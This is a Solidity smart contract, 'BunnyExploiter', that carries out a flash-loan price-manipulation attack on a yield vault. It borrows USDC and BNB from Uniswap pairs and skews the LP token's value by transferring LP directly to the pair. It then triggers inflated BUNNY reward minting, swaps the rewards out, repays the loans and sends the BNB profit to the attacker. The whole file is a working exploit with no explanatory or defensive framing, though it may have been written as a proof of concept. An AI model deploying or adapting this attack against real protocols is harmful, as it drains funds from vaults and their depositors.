// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";


interface IVault {
    function withdrawAllAndEarn() external;
    function depositAll() external;
}

contract BunnyExploiter {

    IUniswapV2Router02 router;
    IUniswapV2Pair usdcDaiPair; // USDC is token0
    IUniswapV2Pair bnbDaiPair; // BNB is token0
    IUniswapV2Pair bnbUsdcPair;
    IERC20 bunny;
    IERC20 usdc;
    IERC20 bnb;
    IVault vault;

    uint256 amountUSDC;
    uint256 amountBNB;

    address attacker;

    constructor(
        address _router,
        address _usdcDaiPair,
        address _bnbDaiPair,
        address _bnbUsdcPair,
        address _bunny,
        address _usdc,
        address _bnb,
        address _vault
    ) {
        router = IUniswapV2Router02(_router);
        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair); // saved for ease of use
        bnbDaiPair = IUniswapV2Pair(_bnbDaiPair);
        bnbUsdcPair = IUniswapV2Pair(_bnbUsdcPair);
        bunny = IERC20(_bunny);
        usdc = IERC20(_usdc);
        bnb = IERC20(_bnb);
        vault = IVault(_vault);
        attacker = msg.sender;
    }

    /// @dev Starts exploit
    function runExploit(uint256 _amountUSDC, uint256 _amountBNB) external {
        amountUSDC = _amountUSDC;
        amountBNB = _amountBNB;

        usdcDaiPair.swap(_amountUSDC,0,address(this),bytes('not empty')); // get USDC first
    }

    /// @dev Flashloan callback - performing two flashloans to get USDC and BNB
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, // USDC, BNB
        uint256 _amount1,
        bytes calldata _data
    ) external {
        if (msg.sender == address(usdcDaiPair)) { // first callback
            bnbDaiPair.swap(amountBNB,0,address(this),bytes('not empty'));

        } else if (msg.sender == address(bnbDaiPair)) { // second callback
            // getting USDC-BNB liquidity, which is the staking token
            usdc.approve(address(router),type(uint256).max);
            bnb.approve(address(router),type(uint256).max);

            router.addLiquidity(
                address(usdc), address(bnb), 
                amountUSDC, amountBNB, // LP minted dependent on larger of the two
                0, 0, 
                address(this), 
                block.timestamp
            );

            // transfer most of the USDC-BNB LP directly to the pair address
            bnbUsdcPair.transfer(address(bnbUsdcPair),bnbUsdcPair.balanceOf(address(this))-1e18);

            // transfer remaining USDC-BNB LP to the vault
            bnbUsdcPair.approve(address(vault),type(uint256).max);
            vault.depositAll();

            // using remaining BNB to dump BNB price in BNB-USDC pool - this is less important
            address[] memory path = new address[](2);
            path[0] = address(bnb);
            path[1] = address(usdc);

            router.swapExactTokensForTokens(
                bnb.balanceOf(address(this)), 
                0, path, address(this), block.timestamp
            );

            // earn rewards and get back LP token constituents
            vault.withdrawAllAndEarn();

            bnbUsdcPair.approve(address(router),type(uint256).max);
            router.removeLiquidity(
                address(usdc),address(bnb),
                bnbUsdcPair.balanceOf(address(this)),
                0, 0, address(this), block.timestamp
            );

            // swapping all minted BUNNY to BNB
            bunny.approve(address(router),type(uint256).max);
            path[0] = address(bunny);
            path[1] = address(bnb);

            router.swapExactTokensForTokens(
                bunny.balanceOf(address(this)), 0, path, address(this), block.timestamp
            );
            
            // calculate the amount of USDC loan repayment
            uint256 usdcLoanAmount = amountUSDC * 1000 * 1e18 / 997 / 1e18 + 1;

            // calculating the amount of BNB loan repayment
            uint256 bnbLoanAmount = amountBNB * 1000 * 1e18 / 997 / 1e18 + 1;

            // swap required BNB back to USDC for loan repayment
            path[0] = address(bnb);
            path[1] = address(usdc);

            router.swapTokensForExactTokens(
                usdcLoanAmount - usdc.balanceOf(address(this)),
                type(uint256).max, path, address(this), block.timestamp
            );

            // repaying the BNB and USDC flashloans, send BNB profit to attacker
            bnb.transfer(address(bnbDaiPair),bnbLoanAmount);
            usdc.transfer(address(usdcDaiPair),usdcLoanAmount);
            bnb.transfer(attacker,bnb.balanceOf(address(this)));
        }
    }

}